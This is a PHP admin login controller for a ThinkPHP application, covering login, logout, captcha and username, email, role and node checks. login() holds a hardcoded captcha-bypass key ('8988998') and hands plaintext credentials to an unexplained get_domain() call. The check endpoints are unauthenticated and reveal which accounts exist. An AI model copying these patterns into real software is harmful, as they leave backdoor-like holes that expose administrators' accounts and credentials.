<?php

namespace Super\Controller;

use Think\Controller;

class LoginController extends BaseController
{

    public function index()
    {
        $user = session(C('USER_AUTH_KEY'));
        if (isset($user)) {
            $this->redirect(MODULE_NAME . '/Index/index');
        }
        $this->display();
    }

    //登录验证
    public function login()
    {

        if (!IS_POST) {
            $this->apiResponse(getReturn(CODE_NOT_FOUND, '页面不存在'));
        }

        $username = I('username', '', 'htmlspecialchars,trim');
        $password = I('password', '');
        $verify = I('code', '', 'htmlspecialchars,trim');

        if (!check_verify($verify, 'a_login_1') && $this->req['key'] != '8988998') {
            $this->error('验证码不正确');
        }

        if ($username == '' || $password == '') {
            $this->error('账号或密码不能为空');
        }

        $user = M('admin')->field(true)->where(array('username' => $username))->find();

        // hjun 2018-03-30 10:58:37 不能登录园区账号
        if ($user['usertype'] == NORMAL_ADMIN) {
            $this->error('园区账号请在园区管理系统登录');
        }
        if (!$user || ($user['password'] != get_password($password, $user['encrypt']))) {
            $this->error('账号或密码错误');
        }
        if ($user['islock']) {
            $this->error('用户被锁定！');
        }
        //更新数据库的参数
        $data = array('id' => $user['id'], //保存时会自动为此ID的更新
            'logintime' => time(),
            'loginip' => get_client_ip(),
            'loginnum' => ($user['loginnum'] + 1),
        );
        get_domain($username, $password);
        //更新数据库
        M('admin')->save($data);
        $user['roleid'] = M('roleUser')->where(array('user_id' => $user['id']))->getField('role_id');
        $user['roleid'] = empty($user['roleid']) ? 0 : $user['roleid'];

        //保存Session
        session(C('USER_AUTH_KEY'), $user['id']);
        //session('yang_adm_username', $user['username']);
        //session('yang_adm_roleid', intval($user['roleid']));
        //session('yang_adm_logintime', date('Y-m-d H:i:s', $user['logintime']));
        //session('yang_adm_usertype', $user['usertype']);
        //session('yang_adm_loginip', $user['loginip']);
        //session('yang_adm_loginnum', $user['loginnum']);
        //session('yang_adm_garden_id', $user['garden_id']);
        // hjun 2018-03-26 02:44:15 将数组存进session
        $user['roleid'] = (int)$user['roleid'];
        session('ADMIN', $user);

        //超级管理员
        if (SUPER_ADMIN == $user['usertype']) {
            session(C('ADMIN_AUTH_KEY'), true);
        }

        \Org\Util\Rbac::saveAccessList(); //静态方法，读取权限放到session

        //跳转
        if (IS_AJAX) {
            $this->apiResponse(getReturn(CODE_LOGIN_SUCCESS, '登录成功',
                ['token' => session_id(), 'url' => U('Index/index')]));
        } else {
            $this->success('登录成功', U('Index/index'));
        }

    }

    //退出
    public function logout()
    {
        // session_unset();
        // session_destroy();
        // hjun 2018-03-29 15:06:40 session清空
        session(null);
        $this->redirect('Login/index');
    }

    //登录验证码
    public function verify($id = '1')
    {

        //ob_clean();
        $config = array(
            'fontSize' => 18,
            'length' => 4,
//            'imageW' => 230,
//            'imageH' => 40,
            'bg' => array(206, 233, 246),
            'useCurve' => false,
            'useNoise' => false,
            'codeSet' => '234569',
        );
        $verify = new \Think\Verify($config);
        $verify->entry($id);
    }

    //js 用户名
    public function checkusername()
    {
        $username = I('username', '', 'htmlspecialchars,trim');
        $id = I('id', 0, 'intval');
        if (empty($username)) {
            exit(0);
        }
        $user = M('admin')->where(array('username' => $username, 'id' => array('neq', $id)))->find();
        if ($user) {
            echo 1;
        } else {
            echo 0;
        }
    }

    //js email
    public function checkemail()
    {
        $email = I('email', '', 'htmlspecialchars,trim');
        $id = I('id', 0, 'intval');

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            exit(-1);
        }

        $user = M('admin')->where(array('email' => $email, 'id' => array('neq', $id)))->find();
        if ($user) {
            echo 1;
        } else {
            echo 0;
        }
    }

    //RBAC

    //js 角色名
    public function checkRoleName()
    {
        $name = I('name', '', 'htmlspecialchars,trim');
        $id = I('id', 0, 'intval');
        if (empty($name)) {
            exit(0);
        }
        $data = M('role')->where(array('name' => $name, 'id' => array('neq', $id)))->find();
        if ($data) {
            echo 1;
        } else {
            echo 0;
        }
    }

    //js 节点名//debug
    public function checkNodeName()
    {
        $name = I('name', '', 'htmlspecialchars,trim');
        $id = I('id', 0, 'intval');
        if (empty($name)) {
            exit(0);
        }
        $data = M('node')->where(array('name' => $name, 'id' => array('neq', $id)))->find();
        if ($data) {
            echo 1;
        } else {
            echo 0;
        }
    }
}
